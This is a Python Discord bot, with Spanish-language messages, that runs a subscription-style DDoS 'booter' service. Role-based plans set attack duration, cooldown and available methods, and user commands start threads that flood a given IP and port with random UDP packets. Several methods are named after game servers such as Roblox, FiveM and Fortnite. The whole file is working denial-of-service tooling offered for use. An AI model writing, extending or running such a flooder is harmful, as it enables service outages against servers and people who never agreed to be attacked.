import discord
from discord.ext import commands
import asyncio
import threading
import socket
import time
import random

TOKEN = 'TU_TOKEN_DISCORD'  # Reemplaza con tu token
INTENTS = discord.Intents.default()
INTENTS.message_content = True
INTENTS.guilds = True
INTENTS.members = True

bot = commands.Bot(command_prefix='!', intents=INTENTS)

active_attacks = {}
cooldowns = {}
global_attack_running = False
admin_id = 1367535670410875070

# Definición de métodos por plan
plans = {
    "freetrial": {
        "attack_time": 30,
        "cooldown": 60,
        "methods": ["hudp"],
        "rank": "FreeTrial"
    },
    "basic": {
        "attack_time": 60,
        "cooldown": 30,
        "methods": ["udppps", "udpbypass", "udppackets"],
        "rank": "Basic"
    },
    "vip": {
        "attack_time": 300,
        "cooldown": 30,
        "methods": [
            "hudp", "udpbypass", "dnsbypass", "roblox", "fivem",
            "fortnite", "udpraw", "tcproxies", "tcpbypass", "udppps", "samp"
        ],
        "rank": "Vip"
    },
    "neolit": {
        "attack_time": 600,
        "cooldown": 10,
        "methods": [
            "hudp", "udpbypass", "dnsbypass", "roblox", "fivem",
            "fortnite", "udpraw", "tcproxies", "tcpbypass", "udppps", "samp", "api"
        ],
        "rank": "Neolit"
    }
}

# Obtener plan desde roles
def get_user_plan(ctx):
    role_names = [r.name.lower() for r in ctx.author.roles]
    if "neolit" in role_names:
        return plans["neolit"]
    elif "vip access" in role_names:
        return plans["vip"]
    elif "basic access" in role_names:
        return plans["basic"]
    elif "freetrial" in role_names:
        return plans["freetrial"]
    else:
        return None  # No tiene plan válido

# Construcción de paquetes UDP simulados
def build_strong_payload():
    return random._urandom(1400)

def strong_udp_bypass(ip, port, duration, stop_event):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timeout and not stop_event.is_set():
        try:
            for _ in range(200):
                payload = build_strong_payload()
                sock.sendto(payload, (ip, port))
        except:
            continue

# Iniciar ataque
async def start_attack(ctx, method, ip, port, duration):
    global global_attack_running

    user_plan = get_user_plan(ctx)

    if user_plan is None:
        await ctx.send("⛔ No tienes un plan activo. Compra uno para usar el bot.")
        return

    if not ip or not port or not duration:
        await ctx.send(f"❗ Uso correcto: `!{method} <ip> <port> <time>`")
        return

    if ip == "127.0.0.1":
        await ctx.send("❌ No puedes atacar 127.0.0.1.")
        return

    if method.lower() not in user_plan["methods"]:
        await ctx.send("❌ No tienes acceso a este método con tu plan.")
        return

    if duration > user_plan["attack_time"]:
        await ctx.send(f"⚠️ El máximo permitido para tu plan es {user_plan['attack_time']} segundos.")
        return

    if ctx.author.id in active_attacks:
        await ctx.send("⛔ Ya tienes un ataque activo.")
        return

    if ctx.author.id in cooldowns:
        await ctx.send("⏳ Debes esperar antes de otro ataque.")
        return

    if global_attack_running:
        await ctx.send("⚠️ Solo un ataque activo global a la vez.")
        return

    global_attack_running = True
    stop_event = threading.Event()
    active_attacks[ctx.author.id] = stop_event

    embed = discord.Embed(
        title="🚀 Ataque Iniciado",
        description=f"**Método:** `{method.upper()}`\n**IP:** `{ip}`\n**Puerto:** `{port}`\n**Duración:** `{duration}s`\n**Usuario:** <@{ctx.author.id}>\n**Plan:** `{user_plan['rank']}`",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)

    thread = threading.Thread(target=strong_udp_bypass, args=(ip, port, duration, stop_event))
    thread.start()

    await asyncio.sleep(duration)
    if not stop_event.is_set():
        stop_event.set()
        await ctx.send(f"✅ Ataque finalizado para <@{ctx.author.id}>.")

    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()
    global_attack_running = False

    await asyncio.sleep(user_plan["cooldown"])
    cooldowns.pop(ctx.author.id, None)

# Generar comandos automáticamente
all_methods = set()
for p in plans.values():
    all_methods.update(p["methods"])

def create_method_command(method_name):
    @bot.command(name=method_name)
    async def dynamic_command(ctx, ip: str = None, port: int = None, duration: int = None):
        await start_attack(ctx, method_name, ip, port, duration)

for method in all_methods:
    create_method_command(method)

@bot.command()
async def methods(ctx):
    user_plan = get_user_plan(ctx)
    if user_plan is None:
        await ctx.send("⛔ No tienes un plan activo para ver métodos.")
        return

    embed = discord.Embed(title="📜 Métodos por Plan", color=discord.Color.blue())
    for plan_name, info in plans.items():
        embed.add_field(
            name=f"{info['rank']}",
            value=", ".join(info["methods"]),
            inline=False
        )
    await ctx.send(embed=embed)

@bot.command()
async def stop(ctx):
    if ctx.author.id not in active_attacks:
        await ctx.send("❌ No tienes ataques activos.")
        return
    active_attacks[ctx.author.id].set()
    await ctx.send("🛑 Ataque detenido.")
    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()
    global global_attack_running
    global_attack_running = False
    await asyncio.sleep(30)
    cooldowns.pop(ctx.author.id, None)

@bot.command()
async def stopall(ctx):
    if ctx.author.id != admin_id:
        await ctx.send("❌ Solo el administrador puede detener todos los ataques.")
        return
    for stop_event in active_attacks.values():
        stop_event.set()
    active_attacks.clear()
    global global_attack_running
    global_attack_running = False
    await ctx.send("🛑 Todos los ataques fueron detenidos.")

@bot.command()
async def dhelp(ctx):
    user_plan = get_user_plan(ctx)
    if user_plan is None:
        await ctx.send("⛔ No tienes un plan activo.")
        return

    embed = discord.Embed(title="📘 Comandos disponibles", color=discord.Color.gold())
    embed.add_field(name="!methods", value="Lista de métodos disponibles por plan", inline=False)
    embed.add_field(name="!stop", value="Detiene tu ataque actual", inline=False)
    embed.add_field(name="!stopall", value="Admin: Detiene todos los ataques", inline=False)
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    print(f"✅ Bot activo como {bot.user.name}")

bot.run(TOKEN)
